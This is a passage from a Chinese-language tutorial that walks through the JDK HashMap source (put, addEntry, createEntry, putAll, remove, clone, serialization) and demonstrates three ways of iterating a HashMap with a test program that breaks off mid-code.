<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span>(<span class="params">K key, V <span class="keyword">value</span></span>) </span>&#123;</div><div class="line">    <span class="comment">// 若“key为null”，则将该键值对添加到table[0]中。</span></div><div class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</div><div class="line">        <span class="keyword">return</span> putForNullKey(<span class="keyword">value</span>);</div><div class="line">    <span class="comment">// 若“key不为null”，则计算该key的哈希值，然后将其添加到该哈希值对应的链表中。</span></div><div class="line">    <span class="keyword">int</span> hash = hash(key.hashCode());</div><div class="line">    <span class="keyword">int</span> i = indexFor(hash, table.length);</div><div class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</div><div class="line">        Object k;</div><div class="line">        <span class="comment">// 若“该key”对应的键值对已经存在，则用新的value取代旧的value。然后退出！</span></div><div class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.<span class="keyword">equals</span>(k))) &#123;</div><div class="line">            V oldValue = e.<span class="keyword">value</span>;</div><div class="line">            e.<span class="keyword">value</span> = <span class="keyword">value</span>;</div><div class="line">            e.recordAccess(<span class="keyword">this</span>);</div><div class="line">            <span class="keyword">return</span> oldValue;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 若“该key”对应的键值对不存在，则将“key-value”添加到table中</span></div><div class="line">    modCount++;</div><div class="line">    addEntry(hash, key, <span class="keyword">value</span>, i);</div><div class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div><br>若要添加到<code>HashMap</code>中的键值对对应的<code>key</code>不在<code>HashMap</code>中，则将其添加到该哈希值对应的链表中，并调用<code>addEntry()</code><br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">addEntry</span>(<span class="params"><span class="keyword">int</span> hash, K key, V <span class="keyword">value</span>, <span class="keyword">int</span> bucketIndex</span>) </span>&#123;</div><div class="line">    <span class="comment">// 保存“bucketIndex”位置的值到“e”中</span></div><div class="line">    Entry&lt;K,V&gt; e = table[bucketIndex];</div><div class="line">    <span class="comment">// 设置“bucketIndex”位置的元素为“新Entry”，</span></div><div class="line">    <span class="comment">// 设置“e”为“新Entry的下一个节点”</span></div><div class="line">    table[bucketIndex] = <span class="keyword">new</span> Entry&lt;K,V&gt;(hash, key, <span class="keyword">value</span>, e);</div><div class="line">    <span class="comment">// 若HashMap的实际大小 不小于 “阈值”，则调整HashMap的大小</span></div><div class="line">    <span class="keyword">if</span> (size++ &gt;= threshold)</div><div class="line">        resize(<span class="number">2</span> * table.length);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>addEntry()</code>的作用是新增Entry。将”key-value”插入指定位置，<code>bucketIndex</code>是位置索引。<br>说到<code>addEntry()</code>，就不得不说另一个函数<code>createEntry()</code>。<code>createEntry()</code>的代码如下：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">createEntry</span>(<span class="params"><span class="keyword">int</span> hash, K key, V <span class="keyword">value</span>, <span class="keyword">int</span> bucketIndex</span>) </span>&#123;</div><div class="line">    <span class="comment">// 保存“bucketIndex”位置的值到“e”中</span></div><div class="line">    Entry&lt;K,V&gt; e = table[bucketIndex];</div><div class="line">    <span class="comment">// 设置“bucketIndex”位置的元素为“新Entry”，</span></div><div class="line">    <span class="comment">// 设置“e”为“新Entry的下一个节点”</span></div><div class="line">    table[bucketIndex] = <span class="keyword">new</span> Entry&lt;K,V&gt;(hash, key, <span class="keyword">value</span>, e);</div><div class="line">    size++;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>它们的作用都是将<code>key</code>、<code>value</code>添加到<code>HashMap</code>中。而且，比较<code>addEntry()</code>和<code>createEntry()</code>的代码，我们发现<code>addEntry()</code>多了两句：<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (size++ &gt;= threshold)</div><div class="line">    resize(<span class="number">2</span> * <span class="keyword">table</span>.length);</div></pre></td></tr></table></figure></p>
<p>那么它们的区别是什么呢?<br>阅读代码，我们可以发现，它们的使用情景不同。<br>1) <code>addEntry()</code>一般用在新增Entry可能导致”HashMap的实际容量”超过”阈值”的情况下。<br>例如，我们新建一个<code>HashMap</code>，然后不断通过<code>put()</code>向<code>HashMap</code>中添加元素；<code>put()</code>是通过<code>addEntry()</code>新增Entry的。<br>在这种情况下，我们不知道何时”HashMap的实际容量”会超过”阈值”；<br>因此，需要调用<code>addEntry()</code>。<br>2) <code>createEntry()</code>一般用在新增Entry不会导致”HashMap的实际容量”超过”阈值”的情况下。<br>例如，我们调用HashMap”带有Map”的构造函数。它会将Map的全部元素添加到<code>HashMap</code>中；<br>但在添加之前，我们已经计算好”HashMap的容量和阈值”。也就是，可以确定”即使将Map中的全部元素添加到HashMap中，都不会超过HashMap的阈值”。<br>此时，调用<code>createEntry()</code>即可。</p>
<h4 id="putAll"><a href="#putAll" class="headerlink" title="putAll()"></a>putAll()</h4><p><code>putAll()</code>的作用是将<code>m</code>的全部元素都添加到<code>HashMap</code>中，它的代码如下：<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">public <span class="keyword">void</span> putAll(<span class="built_in">Map</span>&lt;? <span class="keyword">extends</span> K, ? <span class="keyword">extends</span> V&gt; m) &#123;</div><div class="line">    <span class="comment">// 有效性判断</span></div><div class="line">    <span class="built_in">int</span> numKeysToBeAdded = m.size();</div><div class="line">    <span class="keyword">if</span> (numKeysToBeAdded == <span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 计算容量是否足够，</span></div><div class="line">    <span class="comment">// 若“当前实际容量 &lt; 需要的容量”，则将容量x2。</span></div><div class="line">    <span class="keyword">if</span> (numKeysToBeAdded &gt; threshold) &#123;</div><div class="line">        <span class="built_in">int</span> targetCapacity = (<span class="built_in">int</span>)(numKeysToBeAdded / loadFactor + <span class="number">1</span>);</div><div class="line">        <span class="keyword">if</span> (targetCapacity &gt; MAXIMUM_CAPACITY)</div><div class="line">            targetCapacity = MAXIMUM_CAPACITY;</div><div class="line">        <span class="built_in">int</span> newCapacity = table.length;</div><div class="line">        <span class="keyword">while</span> (newCapacity &lt; targetCapacity)</div><div class="line">            newCapacity &lt;&lt;= <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (newCapacity &gt; table.length)</div><div class="line">            resize(newCapacity);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 通过迭代器，将“m”中的元素逐个添加到HashMap中。</span></div><div class="line">    <span class="keyword">for</span> (<span class="built_in">Iterator</span>&lt;? <span class="keyword">extends</span> <span class="built_in">Map</span>.Entry&lt;? <span class="keyword">extends</span> K, ? <span class="keyword">extends</span> V&gt;&gt; i = m.entrySet().iterator(); i.hasNext(); ) &#123;</div><div class="line">        <span class="built_in">Map</span>.Entry&lt;? <span class="keyword">extends</span> K, ? <span class="keyword">extends</span> V&gt; e = i.next();</div><div class="line">        put(e.getKey(), e.getValue());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div></p>
<h4 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h4><p><code>remove()</code>的作用是删除”键为key”元素<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> V remove(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">    Entry&lt;K,V&gt; e = removeEntryForKey(<span class="built_in">key</span>);</div><div class="line">    <span class="keyword">return</span> (e == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 删除“键为key”的元素</span></div><div class="line"><span class="keyword">final</span> Entry&lt;K,V&gt; removeEntryForKey(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">    <span class="comment">// 获取哈希值。若key为null，则哈希值为0；否则调用hash()进行计算</span></div><div class="line">    <span class="built_in">int</span> hash = (<span class="built_in">key</span> == <span class="keyword">null</span>) ? <span class="number">0</span> : hash(<span class="built_in">key</span>.hashCode());</div><div class="line">    <span class="built_in">int</span> i = indexFor(hash, table.length);</div><div class="line">    Entry&lt;K,V&gt; prev = table[i];</div><div class="line">    Entry&lt;K,V&gt; e = prev;</div><div class="line"></div><div class="line">    <span class="comment">// 删除链表中“键为key”的元素</span></div><div class="line">    <span class="comment">// 本质是“删除单向链表中的节点”</span></div><div class="line">    <span class="keyword">while</span> (e != <span class="keyword">null</span>) &#123;</div><div class="line">        Entry&lt;K,V&gt; next = e.next;</div><div class="line">        <span class="keyword">Object</span> k;</div><div class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</div><div class="line">            ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || (<span class="built_in">key</span> != <span class="keyword">null</span> &amp;&amp; <span class="built_in">key</span>.equals(k)))) &#123;</div><div class="line">            modCount++;</div><div class="line">            <span class="built_in">size</span>--;</div><div class="line">            <span class="keyword">if</span> (prev == e)</div><div class="line">                table[i] = next;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                prev.next = next;</div><div class="line">            e.recordRemoval(<span class="keyword">this</span>);</div><div class="line">            <span class="keyword">return</span> e;</div><div class="line">        &#125;</div><div class="line">        prev = e;</div><div class="line">        e = next;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> e;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div></p>
<h3 id="HashMap实现的Cloneable接口"><a href="#HashMap实现的Cloneable接口" class="headerlink" title="HashMap实现的Cloneable接口"></a>HashMap实现的Cloneable接口</h3><p><code>HashMap</code>实现了<code>Cloneable</code>接口，即实现了<code>clone()</code>方法。<br><code>clone()</code>方法的作用很简单，就是克隆一个<code>HashMap</code>对象并返回。<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 克隆一个HashMap，并返回Object对象</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">Object</span> clone() &#123;</div><div class="line">    <span class="keyword">HashMap</span>&lt;K,V&gt; result = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        result = (<span class="keyword">HashMap</span>&lt;K,V&gt;)<span class="keyword">super</span>.clone();</div><div class="line">    &#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</div><div class="line">        <span class="comment">// assert false;</span></div><div class="line">    &#125;</div><div class="line">    result.table = <span class="keyword">new</span> Entry[table.length];</div><div class="line">    result.entrySet = <span class="keyword">null</span>;</div><div class="line">    result.modCount = <span class="number">0</span>;</div><div class="line">    result.<span class="built_in">size</span> = <span class="number">0</span>;</div><div class="line">    result.init();</div><div class="line">    <span class="comment">// 调用putAllForCreate()将全部元素添加到HashMap中</span></div><div class="line">    result.putAllForCreate(<span class="keyword">this</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div></p>
<h3 id="HashMap实现的Serializable接口。"><a href="#HashMap实现的Serializable接口。" class="headerlink" title="HashMap实现的Serializable接口。"></a>HashMap实现的Serializable接口。</h3><p><code>HashMap</code>实现<code>java.io.Serializable</code>，分别实现了串行读取、写入功能。<br>串行写入函数是<code>writeObject()</code>，它的作用是将<code>HashMap</code>的”总的容量，实际容量，所有的Entry”都写入到输出流中。<br>而串行读取函数是<code>readObject()</code>，它的作用是将<code>HashMap</code>的”总的容量，实际容量，所有的Entry”依次读出。<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// java.io.Serializable的写入函数</span></div><div class="line"><span class="comment">// 将HashMap的“总的容量，实际容量，所有的Entry”都写入到输出流中</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">void</span> writeObject(java.io.ObjectOutputStream s)</div><div class="line">    <span class="keyword">throws</span> IOException</div><div class="line">&#123;</div><div class="line">    Iterator&lt;Map.Entry&lt;K,V&gt;&gt; i =</div><div class="line">        (<span class="built_in">size</span> &gt; <span class="number">0</span>) ? entrySet0().iterator() : <span class="keyword">null</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></div><div class="line">    s.defaultWriteObject();</div><div class="line"></div><div class="line">    <span class="comment">// Write out number of buckets</span></div><div class="line">    s.writeInt(table.length);</div><div class="line"></div><div class="line">    <span class="comment">// Write out size (number of Mappings)</span></div><div class="line">    s.writeInt(<span class="built_in">size</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Write out keys and values (alternating)</span></div><div class="line">    <span class="keyword">if</span> (i != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</div><div class="line">        Map.Entry&lt;K,V&gt; e = i.next();</div><div class="line">        s.writeObject(e.getKey());</div><div class="line">        s.writeObject(e.getValue());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// java.io.Serializable的读取函数：根据写入方式读出</span></div><div class="line"><span class="comment">// 将HashMap的“总的容量，实际容量，所有的Entry”依次读出</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(java.io.ObjectInputStream s)</div><div class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</div><div class="line">&#123;</div><div class="line">    <span class="comment">// Read in the threshold, loadfactor, and any hidden stuff</span></div><div class="line">    s.defaultReadObject();</div><div class="line"></div><div class="line">    <span class="comment">// Read in number of buckets and allocate the bucket array;</span></div><div class="line">    <span class="built_in">int</span> numBuckets = s.readInt();</div><div class="line">    table = <span class="keyword">new</span> Entry[numBuckets];</div><div class="line"></div><div class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></div><div class="line"></div><div class="line">    <span class="comment">// Read in size (number of Mappings)</span></div><div class="line">    <span class="built_in">int</span> <span class="built_in">size</span> = s.readInt();</div><div class="line"></div><div class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></div><div class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">size</span>; i++) &#123;</div><div class="line">        K <span class="built_in">key</span> = (K) s.readObject();</div><div class="line">        V value = (V) s.readObject();</div><div class="line">        putForCreate(<span class="built_in">key</span>, value);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div></p>
<h2 id="HashMap遍历方式"><a href="#HashMap遍历方式" class="headerlink" title="HashMap遍历方式"></a>HashMap遍历方式</h2><h3 id="遍历HashMap的键值对"><a href="#遍历HashMap的键值对" class="headerlink" title="遍历HashMap的键值对"></a>遍历HashMap的键值对</h3><p>第一步：根据<code>entrySet()</code>获取HashMap的”键值对”的Set集合。<br>第二部：通过<code>Iterator</code>迭代器遍历”第一步”得到的集合。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// 假设<span class="meta">map</span>是HashMap对象</div><div class="line">// <span class="meta">map</span>中的key是<span class="keyword">String类型，value是Integer类型</span></div><div class="line"><span class="keyword">Integer </span>integ = null<span class="comment">;</span></div><div class="line"><span class="keyword">Iterator </span><span class="keyword">iter </span>= <span class="meta">map</span>.entrySet().<span class="keyword">iterator();</span></div><div class="line"><span class="keyword">while(iter.hasNext()) </span>&#123;</div><div class="line">    <span class="meta">Map</span>.Entry <span class="meta">entry</span> = (<span class="meta">Map</span>.Entry)<span class="keyword">iter.next();</span></div><div class="line"><span class="keyword"> </span>   // 获取key</div><div class="line">    key = (<span class="keyword">String)entry.getKey();</span></div><div class="line"><span class="keyword"> </span>       // 获取value</div><div class="line">    integ = (Integer)<span class="meta">entry</span>.getValue()<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="遍历HashMap的键"><a href="#遍历HashMap的键" class="headerlink" title="遍历HashMap的键"></a>遍历HashMap的键</h3><p>第一步：根据<code>keySet()</code>获取<code>HashMap</code>的”键”的Set集合。<br>第二步：通过<code>iterator</code>迭代器遍历”第一步”得到的集合。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 假设map是HashMap对象</span></div><div class="line"><span class="comment">// map中的key是String类型，value是Integer类型</span></div><div class="line"><span class="keyword">String</span> <span class="built_in">key</span> = <span class="keyword">null</span>;</div><div class="line">Integer integ = <span class="keyword">null</span>;</div><div class="line">Iterator iter = <span class="built_in">map</span>.keySet().iterator();</div><div class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</div><div class="line">        <span class="comment">// 获取key</span></div><div class="line">    <span class="built_in">key</span> = (<span class="keyword">String</span>)iter.next();</div><div class="line">        <span class="comment">// 根据key，获取value</span></div><div class="line">    integ = (Integer)<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="built_in">key</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="遍历HashMap的值"><a href="#遍历HashMap的值" class="headerlink" title="遍历HashMap的值"></a>遍历HashMap的值</h3><p>第一步：依据<code>value()</code>获取<code>HashMap</code>的”值”的集合。<br>第二步：通过<code>Iterator</code>迭代器遍历”第一步”得到的集合。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 假设<span class="meta">map</span>是HashMap对象</div><div class="line">// <span class="meta">map</span>中的key是<span class="keyword">String类型，value是Integer类型</span></div><div class="line"><span class="keyword">Integer </span>value = null<span class="comment">;</span></div><div class="line"><span class="symbol">Collection</span> c = <span class="meta">map</span>.values()<span class="comment">;</span></div><div class="line"><span class="keyword">Iterator </span><span class="keyword">iter= </span>c.<span class="keyword">iterator();</span></div><div class="line"><span class="keyword">while </span>(<span class="keyword">iter.hasNext()) </span>&#123;</div><div class="line">    value = (Integer)<span class="keyword">iter.next();</span></div><div class="line"><span class="keyword">&#125;</span></div></pre></td></tr></table></figure></p>
<p>遍历测试程序如下：<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.Map;</div><div class="line"><span class="keyword">import</span> java.util.Random;</div><div class="line"><span class="keyword">import</span> java.util.Iterator;</div><div class="line"><span class="keyword">import</span> java.util.<span class="keyword">HashMap</span>;</div><div class="line"><span class="keyword">import</span> java.util.HashSet;</div><div class="line"><span class="keyword">import</span> java.util.Map.Entry;</div><div class="line"><span class="keyword">import</span> java.util.Collection;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * @desc 遍历HashMap的测试程序。</span></div><div class="line"><span class="comment"> *   (01) 通过entrySet()去遍历key、value，参考实现函数：</span></div><div class="line"><span class="comment"> *        iteratorHashMapByEntryset()</span></div><div class="line"><span class="comment"> *   (02) 通过keySet()去遍历key、value，参考实现函数：</span></div><div class="line"><span class="comment"> *        iteratorHashMapByKeyset()</span></div><div class="line"><span class="comment"> *   (03) 通过values()去遍历value，参考实现函数：</span></div><div class="line"><span class="comment"> *        iteratorHashMapJustValues()</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * @author skywang</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> class HashMapIteratorTest &#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</div><div class="line">        <span class="built_in">int</span> val = <span class="number">0</span>;</div><div class="line">        <span class="keyword">String</span> <span class="built_in">key</span> = <span class="keyword">null</span>;</div><div class="line">        Integer value = <span class="keyword">null</span>;</div><div class="line">        Random r = <span class="keyword">new</span> Random();</div><div class="line">        <span class="keyword">HashMap</span> <span class="built_in">map</span> = <span class="keyword">new</span> <span class="keyword">HashMap</span>();</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="number">12</span>; i++) &#123;</div><div class="line">            <span class="comment">// 随机获取一个[0,100)之间的数字</span></div><div class="line">            val = r.nextInt(<span class="number">100</span>);</div><div class="line">            </div><div class="line">            <span class="built_in">key</span> = <span class="keyword">String</span>.valueOf(val);</div><div class="line">            value = r.nextInt(<span class="number">5</span>);</div><div class="line">            <span class="comment">// 添加到HashMap中</span></div><div class="line">            <span class="built_in">map</span>.put(<span class="built_in">key</span>, value);</div><div class="line">            System.out.<span class="built_in">println</span>(<span class="string">" key:"</span>+<span class="built_in">key</span>+<span class="string">" value:"</span>+value);</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 通过entrySet()遍历HashMap的key-value</span></div><div class="line">        iteratorHashMapByEntryset(<span class="built_in">map</span>) ;</div><div class="line">        </div><div class="line">        <span class="comment">// 通过keySet()遍历HashMap的key-value</span></div><div class="line">        iteratorHashMapByKeyset(<span class="built_in">map</span>) ;</div><div class="line">        </div><div class="line">        <span class="comment">// 单单遍历HashMap的value</span></div><div class="line">        iteratorHashMapJustValues(<span class="built_in">map</span>);        </div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">/*</span></div><div class="line"><span class="comment">     * 通过entry set遍历HashMap</span></div><div class="line"><span class="comment">     * 效率高!</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> iteratorHashMapByEntryset(<span class="keyword">HashMap</span> <span class="built_in">map</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">map</span> == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">return</span> ;</div><div class="line"></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"\niterator HashMap By entryset"</span>);</div><div class="line">        <span class="keyword">String</span> <span class="built_in">key</span> = <span class="keyword">null</span>;</div><div class="line">        Integer integ = <span class="keyword">null</span>;</div><div class="line">        Iterator iter = <span class="built_in">map</span>.entrySet().iterator();</div><div class="line">        <span class="keyword">while</span>(iter.hasNext()) &#123;</div><div class="line">            Map.Entry entry = (Map.Entry)iter.next();</div><div class="line">            </div><div class="line">            <span class="built_in">key</span> = (<span class="keyword">String</span>)entry.getKey();</div><div class="line">            integ = (Integer)entry.getValue();</div><div class="line">            System.out.<span class="built_in">println</span>(<span class="built_in">key</span>+<span class="string">" -- "</span>+integ.intValue());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/*</span></div><div class="line"><span class="comment">     * 通过keyset来遍历HashMap</span></div><div class="line"><span class="comment">     * 效率低!</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> iteratorHashMapByKeyset(<span class="keyword">HashMap</span> <span class="built_in">map</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">map</span> == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">return</span> ;</div><div class="line"></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"\niterator HashMap By keyset"</span>);</div><div class="line">        <span class="keyword">String</span> <span class="built_in">key</span> = <span class="keyword">null</span>;</div><div class="line">        Integer integ = <span class="keyword">null</span>;</div><div class="line">        Iterator iter = <span class="built_in">map</span>.keySet().iterator();</div><div class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</div><div class="line">            <span class="built_in">key</span> = (<span class="keyword">String</span>)iter.next();</div><div class="line">            integ = (Integer)<span class="built_in">map</span>.<span 